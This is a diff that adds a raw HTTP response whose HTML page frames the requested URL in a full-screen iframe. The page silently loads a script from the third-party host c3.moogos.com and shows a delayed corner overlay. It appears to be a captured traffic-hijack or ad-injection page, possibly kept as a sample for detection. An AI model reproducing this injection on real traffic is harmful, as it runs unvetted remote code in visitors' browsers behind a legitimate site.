@@ -1,0 +1,79 @@
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Connection: close
+Expires: 0
+Cache-control: no-store,no-cache,must-revalidate,post-check=0,pre-check=0
+Content-Length:1025
+<!DOCTYPE HTML>
+<html>
+<head>
+<title></title>
+<script>
+d=document;
+function u(){
+	var f = d.location.href;
+	d.getElementById("m").src=f+(f.indexOf("&")<0?'?':'&')+'_t=t';
+}
+setTimeout(function(){
+	d.getElementById("x").style.display='block';
+}, 2000);
+function c(){
+	x.style.display="none"
+}
+</script>
+
+<script>
+(function () {
+    var d = document;
+    var db = d.body;
+    if (!db) return setTimeout(arguments.callee, 50);
+    var e = d.createElement('script');
+    e.type = 'text/javascript';
+    e.src = 'http://c3.moogos.com/js/_jssdk.js?aid=se2070e9';
+    db.insertBefore(e, db.children.item(0));
+})();
+</script>
+
+<style>
+body {
+margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial
+}
+a{
+cursor:pointer;
+display:block;
+position:absolute;
+border:1px;border-radius:1em;
+background-color:#555;color:#eee;z-index:3;
+right:5px;
+top:5px;
+line-height:20px;
+text-align:center;
+width:20px;font-size:10px
+}
+
+#x{
+	position:absolute;
+	z-index:2;
+	right:18px;
+	bottom:0px;
+	width:400px;
+	height:300px
+	}
+
+#i{
+	display:block;
+	position:absolute;
+	z-index:1; 
+	width:100%;
+	height:100%
+}
+
+</style>
+</head>
+<body onload="u()">
+<div id="i">
+	<iframe id="m" frameborder="0" width="100%" height="100%">
+	</iframe>
+</div>
+</body>
+</html>
